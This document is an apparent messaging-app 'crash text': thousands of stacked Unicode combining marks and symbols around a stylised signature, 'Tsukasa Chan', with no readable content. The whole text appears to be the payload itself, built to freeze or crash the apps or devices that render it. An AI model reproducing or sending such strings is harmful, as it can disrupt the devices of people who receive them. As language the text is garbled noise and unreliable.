ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝